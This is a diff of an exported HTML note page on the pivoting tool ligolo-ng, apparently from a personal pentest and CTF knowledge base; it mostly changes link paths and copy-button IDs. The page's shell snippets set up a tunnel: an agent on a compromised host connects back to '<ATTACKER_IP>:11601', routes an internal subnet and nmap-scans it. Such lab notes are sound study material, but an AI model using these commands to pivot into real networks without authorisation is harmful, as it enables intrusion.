@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:40 -->
+<!-- 2026-07-20 Mon 15:57 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>ligolo-ng</title>
@@ -895,9 +895,9 @@ proxychains for any AD-heavy pivot.
 </p>
 
 <p>
-Related: <a href="../org/pentest/20260711T205041--dead-drop__ad_ctf_redo_web.html">Dead Drop CTF</a>
-         <a href="../org/20260213T071359--bloodhound__cybersecurity_tool.html">BloodHound</a>
-         <a href="../org/20260314T005731--mimikatz__cybersecurity_tool.html">Mimikatz</a>
+Related: <a href="pentest/20260711T205041--dead-drop__ad_ctf_redo_web.html">Dead Drop CTF</a>
+         <a href="20260213T071359--bloodhound__cybersecurity_tool.html">BloodHound</a>
+         <a href="20260314T005731--mimikatz__cybersecurity_tool.html">Mimikatz</a>
 </p>
 <div id="outline-container-org52adb62" class="outline-2">
 <h2 id="org52adb62">Installation</h2>
@@ -908,11 +908,11 @@ directly.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_dd1702e47614455a9796e7cdab795b8d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_16453aaa64bc4610b302fbe024e39dad>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_dd1702e47614455a9796e7cdab795b8d=document.querySelector('button[name=btn_dd1702e47614455a9796e7cdab795b8d]');
-copyBtnbtn_dd1702e47614455a9796e7cdab795b8d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_proxy_*.tar.gz\n\nwget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_agent_*.tar.gz\n`);copyBtnbtn_dd1702e47614455a9796e7cdab795b8d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_dd1702e47614455a9796e7cdab795b8d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_16453aaa64bc4610b302fbe024e39dad=document.querySelector('button[name=btn_16453aaa64bc4610b302fbe024e39dad]');
+copyBtnbtn_16453aaa64bc4610b302fbe024e39dad.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_proxy_*.tar.gz\n\nwget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_<version>_linux_amd64.tar.gz\ntar xzf ligolo-ng_agent_*.tar.gz\n`);copyBtnbtn_16453aaa64bc4610b302fbe024e39dad.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_16453aaa64bc4610b302fbe024e39dad.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -981,11 +981,11 @@ connection issues.
 <h3 id="org42bbe07">One-time setup — create the tun interface</h3>
 <div class="outline-text-3" id="text-org42bbe07">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_396b103651f14d3f919b66469b7a27a1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8db281f1088c4c278ac7c1ec2a66bb1a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_396b103651f14d3f919b66469b7a27a1=document.querySelector('button[name=btn_396b103651f14d3f919b66469b7a27a1]');
-copyBtnbtn_396b103651f14d3f919b66469b7a27a1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n`);copyBtnbtn_396b103651f14d3f919b66469b7a27a1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_396b103651f14d3f919b66469b7a27a1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a=document.querySelector('button[name=btn_8db281f1088c4c278ac7c1ec2a66bb1a]');
+copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n`);copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8db281f1088c4c278ac7c1ec2a66bb1a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -999,11 +999,11 @@ sudo ip link set ligolo up
 <h3 id="org09a72f0">Start the proxy (attack machine)</h3>
 <div class="outline-text-3" id="text-org09a72f0">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7ea1bb2b372740988ce83c5844ffb48b>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_31c46ff9db0f46adbe83f2b92d7c7543>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7ea1bb2b372740988ce83c5844ffb48b=document.querySelector('button[name=btn_7ea1bb2b372740988ce83c5844ffb48b]');
-copyBtnbtn_7ea1bb2b372740988ce83c5844ffb48b.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo ./proxy -selfcert\n`);copyBtnbtn_7ea1bb2b372740988ce83c5844ffb48b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7ea1bb2b372740988ce83c5844ffb48b.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543=document.querySelector('button[name=btn_31c46ff9db0f46adbe83f2b92d7c7543]');
+copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo ./proxy -selfcert\n`);copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_31c46ff9db0f46adbe83f2b92d7c7543.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1027,11 +1027,11 @@ via webshell, etc.), then run:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7d7a6d3402ea4cb7ba392198f4a64d39>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1e499329bd924d1a9f455edc303a00f0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7d7a6d3402ea4cb7ba392198f4a64d39=document.querySelector('button[name=btn_7d7a6d3402ea4cb7ba392198f4a64d39]');
-copyBtnbtn_7d7a6d3402ea4cb7ba392198f4a64d39.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`./agent -connect <ATTACKER_IP>:11601 -ignore-cert\n`);copyBtnbtn_7d7a6d3402ea4cb7ba392198f4a64d39.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7d7a6d3402ea4cb7ba392198f4a64d39.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_1e499329bd924d1a9f455edc303a00f0=document.querySelector('button[name=btn_1e499329bd924d1a9f455edc303a00f0]');
+copyBtnbtn_1e499329bd924d1a9f455edc303a00f0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`./agent -connect <ATTACKER_IP>:11601 -ignore-cert\n`);copyBtnbtn_1e499329bd924d1a9f455edc303a00f0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1e499329bd924d1a9f455edc303a00f0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1052,11 +1052,11 @@ In the ligolo proxy interface, once the agent has connected:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_3f86d388a9b248d88e51c8641fd4f97f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_61cab7c39c614b9aa31c7cc46e899e89>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3f86d388a9b248d88e51c8641fd4f97f=document.querySelector('button[name=btn_3f86d388a9b248d88e51c8641fd4f97f]');
-copyBtnbtn_3f86d388a9b248d88e51c8641fd4f97f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`session\nifconfig\nstart\n`);copyBtnbtn_3f86d388a9b248d88e51c8641fd4f97f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3f86d388a9b248d88e51c8641fd4f97f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89=document.querySelector('button[name=btn_61cab7c39c614b9aa31c7cc46e899e89]');
+copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`session\nifconfig\nstart\n`);copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_61cab7c39c614b9aa31c7cc46e899e89.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1077,11 +1077,11 @@ the internal subnet via the <code>ligolo</code> interface:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c559e999e9c048148510925a96c57fa1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_575aca0debd247eaaefd94ce1c7a48a1>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_c559e999e9c048148510925a96c57fa1=document.querySelector('button[name=btn_c559e999e9c048148510925a96c57fa1]');
-copyBtnbtn_c559e999e9c048148510925a96c57fa1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo ip route add 192.168.11.0/24 dev ligolo\n`);copyBtnbtn_c559e999e9c048148510925a96c57fa1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c559e999e9c048148510925a96c57fa1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1=document.querySelector('button[name=btn_575aca0debd247eaaefd94ce1c7a48a1]');
+copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo ip route add 192.168.11.0/24 dev ligolo\n`);copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_575aca0debd247eaaefd94ce1c7a48a1.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1094,11 +1094,11 @@ let res = copyTextToClipboard(`sudo ip route add 192.168.11.0/24 dev ligolo\n`);
 <h3 id="org9ebb88a">Verify connectivity</h3>
 <div class="outline-text-3" id="text-org9ebb88a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_46c029b124584b619f16e369455694db>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1592109089c74262b837c13bc03cf165>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_46c029b124584b619f16e369455694db=document.querySelector('button[name=btn_46c029b124584b619f16e369455694db]');
-copyBtnbtn_46c029b124584b619f16e369455694db.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`ip route | grep ligolo\nnmap -sT -Pn -p 445,3389,88 192.168.11.0/24\n`);copyBtnbtn_46c029b124584b619f16e369455694db.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_46c029b124584b619f16e369455694db.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_1592109089c74262b837c13bc03cf165=document.querySelector('button[name=btn_1592109089c74262b837c13bc03cf165]');
+copyBtnbtn_1592109089c74262b837c13bc03cf165.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`ip route | grep ligolo\nnmap -sT -Pn -p 445,3389,88 192.168.11.0/24\n`);copyBtnbtn_1592109089c74262b837c13bc03cf165.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1592109089c74262b837c13bc03cf165.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
